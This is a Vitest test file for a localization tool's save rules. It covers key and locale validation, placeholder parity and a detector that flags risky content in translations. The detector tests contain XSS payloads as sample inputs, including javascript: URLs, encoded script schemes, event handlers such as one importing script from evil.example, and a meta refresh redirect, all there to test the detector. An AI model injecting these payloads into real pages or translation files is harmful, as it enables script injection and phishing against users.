// @vitest-environment node
import { describe, it, expect } from 'vitest';
import {
  detectRiskFlags,
  keyNotAStringMessage,
  namespaceNotFoundMessage,
  RISK_FLAG_MESSAGES,
  sourceReference,
  validateEdit,
  validateWrite,
  type SourceContext,
} from '../../src/core/save-rules.js';

describe('validateWrite', () => {
  it.each(['x.', 'a..b', '.a'])('rejects the key %j with an empty path segment', (key) =>
    expect(validateWrite({ locale: 'en', key, value: 'x' })).toMatchObject({
      ok: false,
      status: 400,
      code: 'INVALID_KEY_FORMAT',
    })
  );

  it('accepts and narrows a valid write', () =>
    expect(
      validateWrite(
        { locale: 'ar', key: 'greeting', value: 'مرحبا {name}' },
        { reference: 'Hello {name}' }
      )
    ).toEqual({ ok: true, locale: 'ar', key: 'greeting', value: 'مرحبا {name}' }));

  it.each([
    [
      { locale: 'e', key: 'a', value: 'x' },
      400,
      'INVALID_LOCALE_FORMAT',
      'Invalid locale string parameter.',
    ],
    [
      { locale: 'en', key: 'a$b', value: 'x' },
      400,
      'INVALID_KEY_FORMAT',
      'Invalid key path. Must be 1-200 characters containing alphanumeric, dots, underscores, or hyphens.',
    ],
    [
      { locale: 'en', key: 'a.__proto__', value: 'x' },
      400,
      'INVALID_KEY_FORMAT',
      'Forbidden key path: segments like __proto__, constructor, or prototype are not allowed.',
    ],
    [
      { locale: 'en', key: 'a', value: 'x'.repeat(10_001) },
      400,
      'INVALID_VALUE_FORMAT',
      'Invalid value. Must be a string less than 10000 characters.',
    ],
    [
      { locale: 'en', key: 'a', value: 'Hello {name' },
      422,
      'MESSAGE_SYNTAX',
      'Message syntax: Unbalanced braces: missing "}".',
    ],
  ])('rejects %o', (input, status, code, error) =>
    expect(validateWrite(input)).toEqual({ ok: false, status, code, error })
  );

  it('reports placeholder drift with details', () =>
    expect(
      validateWrite(
        { locale: 'ar', key: 'greeting', value: 'مرحبا {الاسم}' },
        { reference: 'Hello {name}' }
      )
    ).toEqual({
      ok: false,
      status: 422,
      code: 'PLACEHOLDER_MISMATCH',
      error: 'Placeholders differ from the reference: missing {name}; unexpected {الاسم}.',
      details: { missing: ['{name}'], extra: ['{الاسم}'] },
    }));

  it('checks rules in router order', () =>
    expect(validateWrite({ locale: 'x', key: 'a b', value: 5 })).toMatchObject({
      code: 'INVALID_LOCALE_FORMAT',
    }));

  it.each([undefined, null, ''])('skips parity for reference %j', (reference) =>
    expect(validateWrite({ locale: 'ar', key: 'g', value: 'مرحبا' }, { reference }).ok).toBe(true)
  );

  it('force skips only the 422 rules', () => {
    expect(
      validateWrite(
        { locale: 'ar', key: 'g', value: 'Hello {name' },
        { reference: 'Hi', force: true }
      ).ok
    ).toBe(true);
    expect(
      validateWrite({ locale: 'ar', key: '__proto__', value: 'x' }, { force: true })
    ).toMatchObject({ ok: false, status: 400 });
  });
});

describe('validateEdit', () => {
  const source = {
    greeting: 'Hello {name}',
    cart: { count: '{n, plural, one {# item} other {# items}}' },
    home: { title: 'Home' },
  };
  const ar = { greeting: 'مرحبا {name}', home: { title: 'الرئيسية' } };
  const ctx: SourceContext = { sourceLocale: 'en', source, target: ar };

  it('recomputes the reference from the source locale', () =>
    expect(validateEdit({ locale: 'ar', key: 'greeting', value: 'مرحبا' }, ctx)).toMatchObject({
      ok: false,
      status: 422,
      code: 'PLACEHOLDER_MISMATCH',
      details: { missing: ['{name}'], extra: [] },
    }));

  it('ignores a reference or force smuggled in with the edit', () =>
    expect(
      validateEdit(
        { locale: 'ar', key: 'greeting', value: 'مرحبا', reference: 'مرحبا', force: true } as never,
        ctx
      )
    ).toMatchObject({ code: 'PLACEHOLDER_MISMATCH' }));

  it('accepts matching placeholders and plural branches', () => {
    expect(validateEdit({ locale: 'ar', key: 'greeting', value: 'أهلا {name}' }, ctx).ok).toBe(
      true
    );
    expect(
      validateEdit(
        { locale: 'ar', key: 'cart.count', value: '{n, plural, zero {لا عناصر} other {# عناصر}}' },
        ctx
      ).ok
    ).toBe(true);
    expect(
      validateEdit({ locale: 'ar', key: 'cart.count', value: '{m, plural, other {# عناصر}}' }, ctx)
    ).toMatchObject({ details: { missing: ['{n}'], extra: ['{m}'] } });
  });

  it('uses the current source text as the reference for a source-locale edit', () => {
    expect(validateEdit({ locale: 'en', key: 'greeting', value: 'Hi' }, ctx)).toMatchObject({
      status: 422,
      details: { missing: ['{name}'] },
    });
    expect(validateEdit({ locale: 'en', key: 'greeting', value: 'Hi {name}' }, ctx).ok).toBe(true);
  });

  it('skips parity, not syntax, for a key the source lacks', () => {
    expect(validateEdit({ locale: 'ar', key: 'promo.banner', value: '{x}' }, ctx).ok).toBe(true);
    expect(validateEdit({ locale: 'ar', key: 'promo.banner', value: '{x' }, ctx)).toMatchObject({
      code: 'MESSAGE_SYNTAX',
    });
  });

  it.each(['home', 'home.title.extra'])(
    'refuses %s even with force (would replace a group or a text)',
    (key) => {
      const v = validateEdit({ locale: 'ar', key, value: 'x' }, ctx, { force: true });
      expect(v).toMatchObject({ ok: false, status: 409, code: 'KEY_NOT_A_STRING' });
      expect(!v.ok && v.error).toBe(keyNotAStringMessage(key, 'ar'));
    }
  );

  it('words the occupied-key refusal once for every save path', () =>
    expect(keyNotAStringMessage('home', 'ar')).toBe(
      'Cannot save "home" in ar: it would replace translations that are not a single text.'
    ));

  it('names the missing namespace file and the fix', () => {
    const message = namespaceNotFoundMessage('nav');
    expect(message).toContain('"nav" namespace file (nav.json)');
    expect(message).toContain('keyPrefix');
  });

  it('refuses to shadow a literal dotted key', () =>
    // Review Focus 4
    expect(
      validateEdit(
        { locale: 'ar', key: 'promo.banner', value: 'x' },
        { ...ctx, target: { 'promo.banner': 'قديم' } }
      )
    ).toMatchObject({ status: 409, code: 'KEY_NOT_A_STRING' }));

  it('accepts a key whose text is null, as the write path does', () =>
    expect(
      validateEdit(
        { locale: 'ar', key: 'promo.banner', value: 'x' },
        { ...ctx, target: { promo: { banner: null } } }
      ).ok
    ).toBe(true));

  it('checks a source-locale edit against the source, not target', () =>
    expect(
      validateEdit({ locale: 'en', key: 'home', value: 'x' }, { ...ctx, target: {} })
    ).toMatchObject({ status: 409 }));

  it('treats a locale without a file as empty', () =>
    expect(
      validateEdit(
        { locale: 'fr', key: 'home.title', value: 'Accueil' },
        { sourceLocale: 'en', source }
      ).ok
    ).toBe(true));

  it('keeps the format rules first', () =>
    expect(
      validateEdit({ locale: 'ar', key: 'home.__proto__', value: 'x' }, ctx, { force: true })
    ).toMatchObject({ status: 400, code: 'INVALID_KEY_FORMAT' }));

  it('force skips syntax and parity', () =>
    expect(
      validateEdit({ locale: 'ar', key: 'greeting', value: 'مرحبا {' }, ctx, { force: true }).ok
    ).toBe(true));

  it('sourceReference returns strings only', () => {
    expect(sourceReference('greeting', ctx)).toBe('Hello {name}');
    expect(sourceReference('home', ctx)).toBeNull();
    expect(sourceReference('nope', ctx)).toBeNull();
  });
});

describe('detectRiskFlags', () => {
  it('flags script links', () =>
    expect(detectRiskFlags('Go', 'javascript:alert(1)')).toEqual(['javascript-url']));

  it('keeps URLs and markup the reference already has', () => {
    expect(detectRiskFlags('Visit https://acme.com', 'زر https://acme.com')).toEqual([]);
    expect(detectRiskFlags('<b>Hi</b>', '<b>مرحبا</b>')).toEqual([]);
  });

  it('keeps a URL the reference has when only trailing punctuation or scheme and host case differ', () => {
    expect(detectRiskFlags('Visit https://acme.com today', 'زر الموقع https://acme.com.')).toEqual(
      []
    );
    expect(
      detectRiskFlags('See https://acme.com/help, now', 'انظر https://acme.com/help!?')
    ).toEqual([]);
    expect(detectRiskFlags('Visit https://acme.com', 'VISIT HTTPS://ACME.COM')).toEqual([]);
    expect(detectRiskFlags('Visit www.acme.com/a', 'Visit WWW.Acme.com/a;')).toEqual([]);
  });

  it('still flags a URL whose path differs only by case', () =>
    expect(detectRiskFlags('Visit https://acme.com/a', 'Visit https://acme.com/A')).toEqual([
      'new-url',
    ]));

  it('flags new markup and new URLs', () => {
    expect(detectRiskFlags('Hi', 'Hi <img src=x>')).toEqual(['markup']);
    expect(detectRiskFlags('Read', 'اقرأ https://evil.example')).toEqual(['new-url']);
  });

  it('flags bidi overrides but not LRM or RLM', () => {
    expect(detectRiskFlags('x', 'abc\u202Edef')).toEqual(['bidi-control']);
    expect(detectRiskFlags('x', 'abc\u200Fdef')).toEqual([]);
  });

  it('treats a missing reference as empty', () =>
    expect(detectRiskFlags(undefined, '<b>x</b>')).toEqual(['markup']));

  it('flags vbscript and data links and bare www addresses', () => {
    expect(detectRiskFlags('Go', 'VBScript :msgbox(1)')).toEqual(['javascript-url']);
    expect(detectRiskFlags('Go', 'data:text/html,hi')).toEqual(['javascript-url']);
    expect(detectRiskFlags('Go', 'www.evil.example/login')).toEqual(['new-url']);
  });

  it('checks each script-link kind on its own', () =>
    // A data: link in the reference does not excuse a new javascript: link.
    expect(detectRiskFlags('data:image/png', 'data:image/png javascript:alert(1)')).toEqual([
      'javascript-url',
    ]));

  it('compares tag names without regard to case', () => {
    expect(detectRiskFlags('<B>Hi</B>', '<b>مرحبا</b>')).toEqual([]);
    expect(detectRiskFlags('<b>Hi</b>', '<b>مرحبا</b><SCRIPT>x</SCRIPT>')).toEqual(['markup']);
  });

  it('flags a bidi control the reference lacks even when it has another', () =>
    expect(detectRiskFlags('a\u202Ab', 'a\u202Ab\u2067')).toEqual(['bidi-control']));

  it('reports each flag once, in the order of the union', () =>
    expect(
      detectRiskFlags(
        'x',
        '<b>a</b><i>b</i> https://a.example https://b.example javascript:1 data:text/html \u202E\u202D'
      )
    ).toEqual(['markup', 'javascript-url', 'new-url', 'bidi-control']));

  describe('payloads that keep the reference tags', () => {
    const REF = 'Read our <a href="/terms">terms</a>.';

    it('flags an event handler added to a tag the reference has', () =>
      expect(
        detectRiskFlags(
          REF,
          `Lisez nos <a href="/terms" onmouseover="import('//evil.example/x.js')">conditions</a>.`
        )
      ).toContain('markup'));

    it('flags a style attribute added to a tag the reference has', () =>
      expect(
        detectRiskFlags(
          REF,
          'Lisez nos <a href="/terms" style="position:fixed;inset:0">conditions</a>.'
        )
      ).toEqual(['markup']));

    it('flags a changed link target and a protocol-relative address', () =>
      expect(
        detectRiskFlags(REF, 'Lisez nos <a href="//evil.example/terms">conditions</a>.')
      ).toEqual(['markup', 'new-url']));

    it('flags an entity-encoded script scheme', () =>
      expect(
        detectRiskFlags(REF, 'Lisez nos <a href="java&#115;cript:alert(1)">conditions</a>.')
      ).toEqual(['markup', 'javascript-url']));

    it('flags hex, named-entity and tab-split script schemes', () => {
      expect(detectRiskFlags('Go', 'j&#x61;vascript&colon;alert(1)')).toContain('javascript-url');
      expect(detectRiskFlags('Go', 'java\tscript:alert(1)')).toContain('javascript-url');
      expect(detectRiskFlags('Go', 'java&Tab;script:alert(1)')).toContain('javascript-url');
    });

    it('flags a protocol-relative address in plain text', () =>
      expect(detectRiskFlags('Read', 'Lisez //evil.example/login')).toEqual(['new-url']));

    it('does not flag the same tags with the same attributes in another order or quoting', () => {
      expect(detectRiskFlags(REF, 'Lisez nos <a href="/terms">conditions</a>.')).toEqual([]);
      expect(
        detectRiskFlags(
          '<a href="/terms" class="link">terms</a>',
          "<A class='link' HREF='/terms'>conditions</A>"
        )
      ).toEqual([]);
    });

    it('does not flag a translated title or alt text', () =>
      expect(
        detectRiskFlags(
          '<abbr title="World Health Organization">WHO</abbr>',
          '<abbr title="Organisation mondiale de la santé">OMS</abbr>'
        )
      ).toEqual([]));

    it('does not treat a double slash in prose as an address', () =>
      expect(detectRiskFlags('a / b', 'a // b')).toEqual([]));

    // A browser reads a quoted attribute value to its closing quote, `<` and `>` included.
    it('flags an attribute added after a quoted value that holds < or >', () => {
      expect(
        detectRiskFlags(REF, '<a href="/terms" title="<" onmouseover="alert(1)">terms</a>')
      ).toEqual(['markup']);
      expect(
        detectRiskFlags(REF, '<a href="/terms" title="<" style="position:fixed;inset:0">terms</a>')
      ).toEqual(['markup']);
      expect(
        detectRiskFlags(
          '<a href="/terms" title="Terms">terms</a>',
          `<a href="/terms" title='>' onmouseover="alert(1)">terms</a>`
        )
      ).toEqual(['markup']);
    });

    it('does not flag a translated quoted value that holds < or >', () =>
      expect(
        detectRiskFlags(
          '<a href="/terms" title="Terms > Privacy">terms</a>',
          '<a href="/terms" title="Conditions > Confidentialité">conditions</a>'
        )
      ).toEqual([]));

    it('still reads a tag whose unquoted value holds an apostrophe', () =>
      expect(detectRiskFlags('Hi', "Hi <img src=x onerror=alert(1) alt=it's>")).toEqual([
        'markup',
      ]));

    it('flags a changed srcdoc, content or ping value', () => {
      expect(
        detectRiskFlags(
          'Hi <iframe srcdoc="hello"></iframe>',
          'Salut <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>'
        )
      ).toEqual(['markup']);
      expect(
        detectRiskFlags(
          '<meta http-equiv="refresh" content="5">',
          '<meta http-equiv="refresh" content="0;url=https://evil.example">'
        )
      ).toContain('markup');
      expect(
        detectRiskFlags('<a href="/t" ping="/a">t</a>', '<a href="/t" ping="/b">t</a>')
      ).toEqual(['markup']);
    });
  });

  describe('addresses after a line break or a tab', () => {
    it('flags a new address on its own line or after a tab', () => {
      expect(
        detectRiskFlags('Contact us for help.', 'Contact us\nhttps://evil.example/help')
      ).toEqual(['new-url']);
      expect(detectRiskFlags('Contact us for help.', 'Contact us\r\nhttps://evil.example')).toEqual(
        ['new-url']
      );
      expect(detectRiskFlags('Contact us for help.', 'Contact us\twww.evil.example')).toEqual([
        'new-url',
      ]);
    });

    it('flags a script link on its own line', () =>
      expect(detectRiskFlags('Mail us', 'Mail us\njavascript:alert(1)')).toEqual([
        'javascript-url',
      ]));

    it('does not glue the next line to an address', () =>
      expect(
        detectRiskFlags(
          'Read more at https://acme.com/docs\nThanks!',
          'Plus sur https://acme.com/docs\nMerci !'
        )
      ).toEqual([]));

    it('reads a long run of unclosed quotes quickly', () => {
      const started = Date.now();
      detectRiskFlags('Hi', '<a x="'.repeat(2000));
      detectRiskFlags('Hi', '<a =" '.repeat(2000));
      expect(Date.now() - started).toBeLessThan(1000);
    });

    it('does not flag an address the reference has on its own line too', () =>
      expect(
        detectRiskFlags('Contact us\nhttps://acme.com/help', 'اتصل بنا\nhttps://acme.com/help')
      ).toEqual([]));
  });

  it('has a message for every flag', () =>
    expect(Object.keys(RISK_FLAG_MESSAGES).sort()).toEqual([
      'bidi-control',
      'javascript-url',
      'markup',
      'new-url',
    ]));
});
